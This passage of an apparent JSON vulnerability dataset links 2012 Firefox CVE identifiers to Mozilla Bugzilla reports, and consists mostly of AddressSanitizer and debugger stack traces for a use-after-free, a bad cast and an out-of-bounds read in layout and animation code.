nsGenericElement::RemoveAttribute(nsAString_internal const&) firefox/aurora/content/base/src/nsGenericElement.cpp:2746 #18 0x7f6d8e2fd108 in nsSVGAnimateElement::RemoveAttribute(nsAString_internal const&) firefox/aurora/content/svg/content/src/nsSVGAnimateElement.cpp:60 #19 0x7f6d8e9b9aca in nsIDOMElement_RemoveAttribute(JSContext*, unsigned int, JS::Value*) firefox/aurora/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:3961 #20 0x7f6d97537821 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), js::CallArgs const&) firefox/aurora/js/src/jscntxtinlines.h:314 #21 0x7f6d9749e1cd in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/aurora/js/src/jsinterp.cpp:2757 #22 0x7f6d9741e085 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/aurora/js/src/jsinterp.cpp:475 #23 0x7f6d97537f46 in js::InvokeKernel(JSContext*, js::CallArgs, js::MaybeConstruct) firefox/aurora/js/src/jsinterp.cpp:535 #24 0x7f6d96e6d1d0 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) firefox/aurora/js/src/jsinterp.h:172 #25 0x7f6d9753e0ab in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) firefox/aurora/js/src/jsinterp.cpp:567 #26 0x7f6d96d15aff in JS_CallFunctionValue firefox/aurora/js/src/jsapi.cpp:5416 #27 0x7f6d8e7f6d29 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) firefox/aurora/js/xpconnect/src/XPCWrappedJSClass.cpp:1509 #28 0x7f6d8e79f328 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) firefox/aurora/js/xpconnect/src/XPCWrappedJS.cpp:617 #29 0x7f6d92af2800 in PrepareAndDispatch firefox/aurora/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:153 #30 0x7f6d92aeff97 in SharedStub firefox/aurora/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 #31 0x7f6d8aad1759 in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsIDOMEventTarget*, unsigned int, nsCxPusher*) firefox/aurora/content/events/src/nsEventListenerManager.cpp:818 #32 0x7f6d8aad2b78 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) firefox/aurora/content/events/src/nsEventListenerManager.cpp:875 #33 0x7f6d8ac5bdc7 in nsEventListenerManager::HandleEvent(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) firefox/aurora/content/events/src/nsEventListenerManager.h:170 #34 0x7f6d8ac4a1b6 in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned int, bool, nsCxPusher*) firefox/aurora/content/events/src/nsEventDispatcher.cpp:218 #35 0x7f6d8ac47d0c in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned int, nsDispatchingCallback*, bool, nsCxPusher*) firefox/aurora/content/events/src/nsEventDispatcher.cpp:346 #36 0x7f6d8ac4dbb4 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<nsIDOMEventTarget>*) firefox/aurora/content/events/src/nsEventDispatcher.cpp:679 #37 0x7f6d8854f2bf in DocumentViewerImpl::LoadComplete(unsigned int) firefox/aurora/layout/base/nsDocumentViewer.cpp:1071 #38 0x7f6d8f6477f3 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, unsigned int) firefox/aurora/docshell/base/nsDocShell.cpp:6200 #39 0x7f6d8f63f601 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, unsigned int) firefox/aurora/docshell/base/nsDocShell.cpp:6031 #40 0x7f6d8f6407e5 in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, unsigned int) firefox/aurora/modules/zlib/src/gzlib.c:0 #41 0x7f6d8f73ff04 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, unsigned int) firefox/aurora/uriloader/base/nsDocLoader.cpp:1384 #42 0x7f6d8f73d915 in nsDocLoader::doStopDocumentLoad(nsIRequest*, unsigned int) firefox/aurora/uriloader/base/nsDocLoader.cpp:962 #43 0x7f6d8f736aa8 in nsDocLoader::DocLoaderIsEmpty(bool) firefox/aurora/uriloader/base/nsDocLoader.cpp:854 #44 0x7f6d8f73b0cc in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) firefox/aurora/uriloader/base/nsDocLoader.cpp:736 #45 0x7f6d8f73cc3d in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) firefox/aurora/modules/zlib/src/gzlib.c:0 #46 0x7f6d86e83279 in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, unsigned int) firefox/aurora/netwerk/base/src/nsLoadGroup.cpp:731 #47 0x7f6d89f98714 in nsDocument::DoUnblockOnload() firefox/aurora/content/base/src/nsDocument.cpp:7278 #48 0x7f6d89f98191 in nsDocument::UnblockOnload(bool) firefox/aurora/content/base/src/nsDocument.cpp:7221 #49 0x7f6d89f48e94 in nsDocument::DispatchContentLoadedEvents() firefox/aurora/content/base/src/nsDocument.cpp:4271 #50 0x7f6d8a002c69 in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() firefox/aurora/../../../dist/include/nsThreadUtils.h:345 #51 0x7f6d929e530e in nsThread::ProcessNextEvent(bool, bool*) firefox/aurora/xpcom/threads/nsThread.cpp:657 #52 0x7f6d926733fd in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/aurora/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:245 #53 0x7f6d91a65146 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/aurora/ipc/glue/MessagePump.cpp:110 #54 0x7f6d92c9ca8a in MessageLoop::RunInternal() firefox/aurora/ipc/chromium/src/base/message_loop.cc:209 #55 0x7f6d92c9c8d3 in MessageLoop::RunHandler() firefox/aurora/ipc/chromium/src/base/message_loop.cc:202 #56 0x7f6d92c9c7b8 in MessageLoop::Run() firefox/aurora/ipc/chromium/src/base/message_loop.cc:176 #57 0x7f6d90fabbde in nsBaseAppShell::Run() firefox/aurora/widget/xpwidgets/nsBaseAppShell.cpp:191 #58 0x7f6d8fbd5c88 in nsAppStartup::Run() firefox/aurora/toolkit/components/startup/nsAppStartup.cpp:295 #59 0x7f6d86c63fb2 in XREMain::XRE_mainRun() firefox/aurora/toolkit/xre/nsAppRunner.cpp:3780 #60 0x7f6d86c6a112 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/aurora/toolkit/xre/nsAppRunner.cpp:3857 #61 0x7f6d86c6d5c8 in XRE_main firefox/aurora/toolkit/xre/nsAppRunner.cpp:3933 #62 0x40a7a3 in do_main(int, char**) firefox/aurora/browser/app/nsBrowserApp.cpp:190 #63 0x40832e in main firefox/aurora/browser/app/nsBrowserApp.cpp:277 0x7f6d5ecb0b90 is located 16 bytes inside of 128-byte region [0x7f6d5ecb0b80,0x7f6d5ecb0c00) freed by thread T0 here: #0 0x4a4272 in free ??:0 #1 0x7f6d9e6ad673 in moz_free firefox/aurora/memory/mozalloc/mozalloc.cpp:82 #2 0x7f6d8e48199f in ~nsAutoPtr firefox/aurora/../../dist/include/nsAutoPtr.h:106 #3 0x7f6d8e46cf13 in ~nsAutoPtr firefox/aurora/../../dist/include/nsAutoPtr.h:106 #4 0x7f6d8e480913 in nsTArrayElementTraits<nsAutoPtr<nsSMILTimeValueSpec> >::Destruct(nsAutoPtr<nsSMILTimeValueSpec>*) firefox/aurora/../../dist/include/nsTArray.h:381 #5 0x7f6d8e480578 in nsTArray<nsAutoPtr<nsSMILTimeValueSpec>, nsTArrayDefaultAllocator>::DestructRange(unsigned int, unsigned int) firefox/aurora/../../dist/include/nsTArray.h:1242 #6 0x7f6d8e480007 in nsTArray<nsAutoPtr<nsSMILTimeValueSpec>, nsTArrayDefaultAllocator>::RemoveElementsAt(unsigned int, unsigned int) firefox/aurora/../../dist/include/nsTArray.h:964 #7 0x7f6d8e46d03f in nsTArray<nsAutoPtr<nsSMILTimeValueSpec>, nsTArrayDefaultAllocator>::Clear() firefox/aurora/../../dist/include/nsTArray.h:975 #8 0x7f6d8e46825c in nsSMILTimedElement::ClearSpecs(nsTArray<nsAutoPtr<nsSMILTimeValueSpec>, nsTArrayDefaultAllocator>&, nsTArray<nsRefPtr<nsSMILInstanceTime>, nsTArrayDefaultAllocator>&, bool (*)(nsSMILInstanceTime*)) firefox/aurora/content/smil/nsSMILTimedElement.cpp:1331 #9 0x7f6d8e4611a0 in nsSMILTimedElement::UnsetEndSpec(bool (*)(nsSMILInstanceTime*)) firefox/aurora/content/smil/nsSMILTimedElement.cpp:904 #10 0x7f6d8e465f36 in nsSMILTimedElement::UnsetAttr(nsIAtom*) firefox/aurora/content/smil/nsSMILTimedElement.cpp:854 #11 0x7f6d8e337423 in nsSVGAnimationElement::UnsetAttr(int, nsIAtom*, bool) firefox/aurora/content/svg/content/src/nsSVGAnimationElement.cpp:411 #12 0x7f6d8a157d03 in nsGenericElement::RemoveAttribute(nsAString_internal const&) firefox/aurora/content/base/src/nsGenericElement.cpp:2746 #13 0x7f6d8e2fd108 in nsSVGAnimateElement::RemoveAttribute(nsAString_internal const&) firefox/aurora/content/svg/content/src/nsSVGAnimateElement.cpp:60 #14 0x7f6d8e9b9aca in nsIDOMElement_RemoveAttribute(JSContext*, unsigned int, JS::Value*) firefox/aurora/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:3961 #15 0x7f6d97537821 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), js::CallArgs const&) firefox/aurora/js/src/jscntxtinlines.h:314 #16 0x7f6d9749e1cd in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/aurora/js/src/jsinterp.cpp:2757 #17 0x7f6d9741e085 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/aurora/js/src/jsinterp.cpp:475 #18 0x7f6d97537f46 in js::InvokeKernel(JSContext*, js::CallArgs, js::MaybeConstruct) firefox/aurora/js/src/jsinterp.cpp:535 #19 0x7f6d96e6d1d0 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) firefox/aurora/js/src/jsinterp.h:172 #20 0x7f6d9753e0ab in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) firefox/aurora/js/src/jsinterp.cpp:567 #21 0x7f6d96d15aff in JS_CallFunctionValue firefox/aurora/js/src/jsapi.cpp:5416 #22 0x7f6d8e7f6d29 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) firefox/aurora/js/xpconnect/src/XPCWrappedJSClass.cpp:1509 #23 0x7f6d8e79f328 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) firefox/aurora/js/xpconnect/src/XPCWrappedJS.cpp:617 #24 0x7f6d92af2800 in PrepareAndDispatch firefox/aurora/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:153 #25 0x7f6d92aeff97 in SharedStub firefox/aurora/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 #26 0x7f6d8aad1759 in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsIDOMEventTarget*, unsigned int, nsCxPusher*) firefox/aurora/content/events/src/nsEventListenerManager.cpp:818 #27 0x7f6d8aad2b78 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) firefox/aurora/content/events/src/nsEventListenerManager.cpp:875 #28 0x7f6d8ac5bdc7 in nsEventListenerManager::HandleEvent(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) firefox/aurora/content/events/src/nsEventListenerManager.h:170 #29 0x7f6d8ac4a1b6 in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned int, bool, nsCxPusher*) firefox/aurora/content/events/src/nsEventDispatcher.cpp:218 previously allocated by thread T0 here: #0 0x4a4332 in malloc ??:0 #1 0x7f6d9e6ad7c7 in moz_xmalloc firefox/aurora/memory/mozalloc/mozalloc.cpp:87 #2 0x7f6d8e4676ed in nsSMILTimedElement::SetBeginOrEndSpec(nsAString_internal const&, mozilla::dom::Element*, bool, bool (*)(nsSMILInstanceTime*)) firefox/aurora/content/smil/nsSMILTimedElement.cpp:1290 #3 0x7f6d8e461779 in nsSMILTimedElement::SetEndSpec(nsAString_internal const&, mozilla::dom::Element*, bool (*)(nsSMILInstanceTime*)) firefox/aurora/content/smil/nsSMILTimedElement.cpp:897 #4 0x7f6d8e461e32 in nsSMILTimedElement::SetAttr(nsIAtom*, nsAString_internal const&, nsAttrValue&, mozilla::dom::Element*, unsigned int*) firefox/aurora/content/smil/nsSMILTimedElement.cpp:816 #5 0x7f6d8e335a4d in nsSVGAnimationElement::ParseAttribute(int, nsIAtom*, nsAString_internal const&, nsAttrValue&) firefox/aurora/content/svg/content/src/nsSVGAnimationElement.cpp:360 #6 0x7f6d8a193883 in nsGenericElement::SetAttr(int, nsIAtom*, nsIAtom*, nsAString_internal const&, bool) firefox/aurora/content/base/src/nsGenericElement.cpp:5261 #7 0x7f6d8b68a3fb in nsXMLContentSink::AddAttributes(unsigned short const**, nsIContent*) firefox/aurora/content/xml/document/src/nsXMLContentSink.cpp:1502 #8 0x7f6d8b67c81f in nsXMLContentSink::HandleStartElement(unsigned short const*, unsigned short const**, unsigned int, int, unsigned int, bool) firefox/aurora/content/xml/document/src/nsXMLContentSink.cpp:1056 #9 0x7f6d8b67b02b in nsXMLContentSink::HandleStartElement(unsigned short const*, unsigned short const**, unsigned int, int, unsigned int) firefox/aurora/content/xml/document/src/nsXMLContentSink.cpp:980 #10 0x7f6d8b67dd8d in non-virtual thunk to nsXMLContentSink::HandleStartElement(unsigned short const*, unsigned short const**, unsigned int, int, unsigned int) firefox/aurora/modules/zlib/src/gzlib.c:0 #11 0x7f6d87c3f3d1 in nsExpatDriver::HandleStartElement(unsigned short const*, unsigned short const**) firefox/aurora/parser/htmlparser/src/nsExpatDriver.cpp:411 #12 0x7f6d87c582a7 in Driver_HandleStartElement(void*, unsigned short const*, unsigned short const**) firefox/aurora/parser/htmlparser/src/nsExpatDriver.cpp:95 #13 0x7f6d87d9c17a in doContent firefox/aurora/parser/expat/lib/xmlparse.c:2387 #14 0x7f6d87d81499 in contentProcessor firefox/aurora/parser/expat/lib/xmlparse.c:2043 #15 0x7f6d87d66c09 in doProlog firefox/aurora/parser/expat/lib/xmlparse.c:4024 #16 0x7f6d87d61b82 in prologProcessor firefox/aurora/parser/expat/lib/xmlparse.c:3758 #17 0x7f6d87dcf1f1 in prologInitProcessor firefox/aurora/parser/expat/lib/xmlparse.c:3575 #18 0x7f6d87d46a01 in MOZ_XML_Parse firefox/aurora/parser/expat/lib/xmlparse.c:1520 #19 0x7f6d87c51694 in nsExpatDriver::ParseBuffer(unsigned short const*, unsigned int, bool, unsigned int*) firefox/aurora/parser/htmlparser/src/nsExpatDriver.cpp:1020 #20 0x7f6d87c52a93 in nsExpatDriver::ConsumeToken(nsScanner&, bool&) firefox/aurora/parser/htmlparser/src/nsExpatDriver.cpp:1121 #21 0x7f6d87c54a62 in non-virtual thunk to nsExpatDriver::ConsumeToken(nsScanner&, bool&) firefox/aurora/modules/zlib/src/gzlib.c:0 #22 0x7f6d87ce9a2b in nsParser::Tokenize(bool) firefox/aurora/parser/htmlparser/src/nsParser.cpp:2275 ==26824== ABORTING Stats: 132M malloced (146M for red zones) by 322256 calls Stats: 40M realloced by 18232 calls Stats: 103M freed by 211052 calls Stats: 0M really freed by 0 calls Stats: 312M (79916 full pages) mmaped in 78 calls mmaps by size class: 8:262128; 9:49146; 10:16380; 11:16376; 12:2048; 13:2048; 14:1536; 15:384; 16:512; 17:128; 18:96; 19:56; 20:16; mallocs by size class: 8:245743; 9:42218; 10:13971; 11:14225; 12:2028; 13:1650; 14:1384; 15:271; 16:505; 17:105; 18:94; 19:49; 20:13; frees by size class: 8:150073; 9:33717; 10:11296; 11:11665; 12:1405; 13:825; 14:1204; 15:230; 16:438; 17:92; 18:52; 19:45; 20:10; rfrees by size class: Stats: malloc large: 261 small slow: 1663 Shadow byte and word: 0x1fedabd96172: fd 0x1fedabd96170: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fedabd96150: fd fd fd fd fd fd fd fd 0x1fedabd96158: fd fd fd fd fd fd fd fd 0x1fedabd96160: fa fa fa fa fa fa fa fa 0x1fedabd96168: fa fa fa fa fa fa fa fa =>0x1fedabd96170: fd fd fd fd fd fd fd fd 0x1fedabd96178: fd fd fd fd fd fd fd fd 0x1fedabd96180: fa fa fa fa fa fa fa fa 0x1fedabd96188: fa fa fa fa fa fa fa fa 0x1fedabd96190: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-1952": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=759249",
        "title": "Bad cast in nsTableFrame::InsertFrames",
        "description": "Reproduces on Firefox trunk 20120528230131 http://hg.mozilla.org/mozilla-central/rev/79262a88881d First it hits the asserts here. NS_IMETHODIMP nsTableFrame::InsertFrames(ChildListID aListID, nsIFrame* aPrevFrame, nsFrameList& aFrameList) { ........ #ifdef DEBUG // verify that all sibling have the same type, if they do not, expect cellmap issues for (nsFrameList::Enumerator e(aFrameList); !e.AtEnd(); e.Next()) { const nsStyleDisplay* nextDisplay = e.get()->GetStyleDisplay(); NS_ASSERTION((display->mDisplay == NS_STYLE_DISPLAY_TABLE_COLUMN_GROUP) == (nextDisplay->mDisplay == NS_STYLE_DISPLAY_TABLE_COLUMN_GROUP), \"heterogenous childlist\"); } #endif Bad cast happens here. We get a nsTableRowGroupFrame, which gets incorrectly casted to nsTableColGroupFrame. void nsTableFrame::InsertColGroups(PRInt32 aStartColIndex, const nsFrameList::Slice& aColGroups) { PRInt32 colIndex = aStartColIndex; nsFrameList::Enumerator colGroups(aColGroups); for (; !colGroups.AtEnd(); colGroups.Next()) { nsTableColGroupFrame* cgFrame = static_cast<nsTableColGroupFrame*>(colGroups.get()); > xul.dll!nsTableFrame::InsertColGroups(int aStartColIndex=0, const nsFrameList::Slice & aColGroups={...}) Line 546 + 0x10 bytes C++ xul.dll!nsTableFrame::InsertFrames(mozilla::layout::FrameChildListID aListID=kPrincipalList, nsIFrame * aPrevFrame=0x00000000, nsFrameList & aFrameList={...}) Line 2240 + 0x10 bytes C++ xul.dll!nsFrameManager::InsertFrames(nsIFrame * aParentFrame=0x059edd90, mozilla::layout::FrameChildListID aListID=kPrincipalList, nsIFrame * aPrevFrame=0x00000000, nsFrameList & aFrameList={...}) Line 500 C++ xul.dll!nsCSSFrameConstructor::AppendFramesToParent(nsFrameConstructorState & aState={...}, nsIFrame * aParentFrame=0x059edd90, nsFrameItems & aFrameList={...}, nsIFrame * aPrevSibling=0x00000000, bool aIsRecursiveCall=false) Line 5728 C++ xul.dll!nsCSSFrameConstructor::ContentAppended(nsIContent * aContainer=0x059eff88, nsIContent * aFirstNewContent=0x050baec0, bool aAllowLazyConstruction=true) Line 6660 C++ xul.dll!PresShell::ContentAppended(nsIDocument * aDocument=0x08218b70, nsIContent * aContainer=0x059eff88, nsIContent * aFirstNewContent=0x050baec0, int aNewIndexInContainer=1) Line 4170 C++ xul.dll!nsNodeUtils::ContentAppended(nsIContent * aContainer=0x059eff88, nsIContent * aFirstNewContent=0x050baec0, int aNewIndexInContainer=1) Line 148 + 0xce bytes C++ xul.dll!nsHtml5PendingNotification::Fire() Line 61 + 0x2b bytes C++ xul.dll!nsHtml5TreeOpExecutor::FlushPendingAppendNotifications() Line 324 C++ xul.dll!nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor * aBuilder=0x08219ab8, nsIContent * * aScriptElement=0x0014ce48) Line 517 C++ xul.dll!nsHtml5TreeOpExecutor::RunFlushLoop() Line 530 C++ xul.dll!nsHtml5ExecutorReflusher::Run() Line 96 C++ xul.dll!nsThread::ProcessNextEvent(bool mayWait=false, bool * result=0x0014ceff) Line 657 + 0x19 bytes C++ xul.dll!NS_ProcessNextEvent_P(nsIThread * thread=0x008a9e38, bool mayWait=false) Line 245 + 0x17 bytes C++ xul.dll!mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate * aDelegate=0x008a69a8) Line 110 + 0xe bytes C++ xul.dll!MessageLoop::RunInternal() Line 209 C++ xul.dll!MessageLoop::RunHandler() Line 202 C++ xul.dll!MessageLoop::Run() Line 176 C++ xul.dll!nsBaseAppShell::Run() Line 191 C++ xul.dll!nsAppShell::Run() Line 252 + 0x9 bytes C++ xul.dll!nsAppStartup::Run() Line 295 + 0x1c bytes C++ xul.dll!XRE_main(int argc=1, char * * argv=0x00188010, const nsXREAppData * aAppData=0x012fb844) Line 3703 + 0x25 bytes C++ firefox.exe!do_main(int argc=1, char * * argv=0x00188010) Line 190 + 0x13 bytes C++ firefox.exe!NS_internal_main(int argc=1, char * * argv=0x00188010) Line 277 + 0xd bytes C++ firefox.exe!wmain(int argc=1, wchar_t * * argv=0x00181b90) Line 107 + 0xd bytes C++ firefox.exe!__tmainCRTStartup() Line 583 + 0x19 bytes C firefox.exe!wmainCRTStartup() Line 403 C"
      }
    ],
    "CVE-2012-1953": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=765218",
        "title": "Out of bounds read in ElementAnimations::EnsureStyleRuleFor",
        "description": "Reproduces on trunk ================================================================= ==32187== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f9aecc43f3c at pc 0x7f9b1682427b bp 0x7fffc335c370 sp 0x7fffc335c368 READ of size 4 at 0x7f9aecc43f3c thread T0 #0 0x7f9b1682427b in ElementAnimations::EnsureStyleRuleFor(mozilla::TimeStamp, InfallibleTArray<nsAnimationManager::AnimationEventInfo>&) firefox/src/layout/style/nsAnimationManager.cpp:274 #1 0x7f9b1682a9f9 in nsAnimationManager::CheckAnimationRule(nsStyleContext*, mozilla::dom::Element*) firefox/src/layout/style/nsAnimationManager.cpp:518 #2 0x7f9b16d378d3 in nsStyleSet::GetContext(nsStyleContext*, nsRuleNode*, nsRuleNode*, bool, bool, nsIAtom*, nsCSSPseudoElements::Type, bool, mozilla::dom::Element*) firefox/src/layout/style/nsStyleSet.cpp:618 #3 0x7f9b16d3f06d in nsStyleSet::ResolveStyleFor(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&) firefox/src/layout/style/nsStyleSet.cpp:953 #4 0x7f9b15aa8e90 in nsCSSFrameConstructor::ResolveStyleContext(nsStyleContext*, nsIContent*, nsFrameConstructorState*) firefox/src/layout/base/nsCSSFrameConstructor.cpp:4546 #5 0x7f9b15aa88ea in nsCSSFrameConstructor::ResolveStyleContext(nsIFrame*, nsIContent*, nsFrameConstructorState*) firefox/src/layout/base/nsCSSFrameConstructor.cpp:4533 #6 0x7f9b15aaea7b in nsCSSFrameConstructor::AddFrameConstructionItems(nsFrameConstructorState&, nsIContent*, bool, nsIFrame*, nsCSSFrameConstructor::FrameConstructionItemList&) firefox/src/layout/base/nsCSSFrameConstructor.cpp:4986 #7 0x7f9b15ad1c98 in nsCSSFrameConstructor::ContentAppended(nsIContent*, nsIContent*, bool) firefox/src/layout/base/nsCSSFrameConstructor.cpp:6552 #8 0x7f9b15ac930f in nsCSSFrameConstructor::CreateNeededFrames(nsIContent*) firefox/src/layout/base/nsCSSFrameConstructor.cpp:6244 #9 0x7f9b15ac9435 in nsCSSFrameConstructor::CreateNeededFrames(nsIContent*) firefox/src/layout/base/nsCSSFrameConstructor.cpp:6256 #10 0x7f9b15ad3a1b in nsCSSFrameConstructor::CreateNeededFrames() firefox/src/layout/base/nsCSSFrameConstructor.cpp:6270 #11 0x7f9b15ee3fab in PresShell::FlushPendingNotifications(mozFlushType) firefox/src/layout/base/nsPresShell.cpp:3813 #12 0x7f9b177360fe in nsDocument::FlushPendingNotifications(mozFlushType) firefox/src/content/base/src/nsDocument.cpp:6297 #13 0x7f9b1d6052a4 in nsDocLoader::DocLoaderIsEmpty(bool) firefox/src/uriloader/base/nsDocLoader.cpp:775 #14 0x7f9b1d609c1c in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) firefox/src/uriloader/base/nsDocLoader.cpp:704 #15 0x7f9b1d60b76d in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) firefox/src/modules/zlib/src/inffast.c:0 #16 0x7f9b146f7669 in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, unsigned int) firefox/src/netwerk/base/src/nsLoadGroup.cpp:698 #17 0x7f9b1774a9a4 in nsDocument::DoUnblockOnload() firefox/src/content/base/src/nsDocument.cpp:7166 #18 0x7f9b1774a431 in nsDocument::UnblockOnload(bool) firefox/src/content/base/src/nsDocument.cpp:7109 #19 0x7f9b176fc967 in nsDocument::DispatchContentLoadedEvents() firefox/src/content/base/src/nsDocument.cpp:4180 #20 0x7f9b177bbe49 in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() firefox/src/../../../dist/include/nsThreadUtils.h:349 #21 0x7f9b20b38463 in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #22 0x7f9b207c7a0d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:216 #23 0x7f9b1d9ba5a6 in nsXULWindow::ShowModal() firefox/src/xpfe/appshell/src/nsXULWindow.cpp:378 #24 0x7f9b1d99d522 in nsContentTreeOwner::ShowAsModal() firefox/src/xpfe/appshell/src/nsContentTreeOwner.cpp:529 #25 0x7f9b1d99d69c in non-virtual thunk to nsContentTreeOwner::ShowAsModal() firefox/src/modules/zlib/src/inffast.c:0 #26 0x7f9b1d7c5844 in nsWindowWatcher::OpenWindowJSInternal(nsIDOMWindow*, char const*, char const*, char const*, bool, nsIArray*, bool, nsIDOMWindow**) firefox/src/embedding/components/windowwatcher/src/nsWindowWatcher.cpp:1000 #27 0x7f9b1d7bbe21 in nsWindowWatcher::OpenWindow(nsIDOMWindow*, char const*, char const*, char const*, nsISupports*, nsIDOMWindow**) firefox/src/embedding/components/windowwatcher/src/nsWindowWatcher.cpp:381 #28 0x7f9b20c36dea in NS_InvokeByIndex_P firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 #29 0x7f9b1c5c3b87 in CallMethodHelper::Invoke() firefox/src/js/xpconnect/src/XPCWrappedNative.cpp:3107 #30 0x7f9b1c62beef in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) firefox/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1500 #31 0x7f9b25e1c23d in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), js::CallArgs const&) firefox/src/js/src/jscntxtinlines.h:395 #32 0x7f9b25d8ff1b in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2435 #33 0x7f9b25d15317 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:267 #34 0x7f9b25e1c65f in js::InvokeKernel(JSContext*, js::CallArgs, js::MaybeConstruct) firefox/src/js/src/jsinterp.cpp:322 #35 0x7f9b257d8090 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) firefox/src/js/src/jsinterp.h:100 #36 0x7f9b25e2178d in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) firefox/src/js/src/jsinterp.cpp:354 #37 0x7f9b25682459 in JS_CallFunctionValue firefox/src/js/src/jsapi.cpp:5490 #38 0x7f9b1c571f81 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) firefox/src/js/xpconnect/src/XPCWrappedJSClass.cpp:1475 #39 0x7f9b1c523198 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) firefox/src/js/xpconnect/src/XPCWrappedJS.cpp:579 #40 0x7f9b20c3c9a0 in PrepareAndDispatch firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 #41 0x7f9b20c3a137 in SharedStub firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 #42 0x7f9b20c36dea in NS_InvokeByIndex_P firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 #43 0x7f9b1c5c3b87 in CallMethodHelper::Invoke() firefox/src/js/xpconnect/src/XPCWrappedNative.cpp:3107 #44 0x7f9b1c62beef in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) firefox/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1500 #45 0x7f9b25e1c23d in 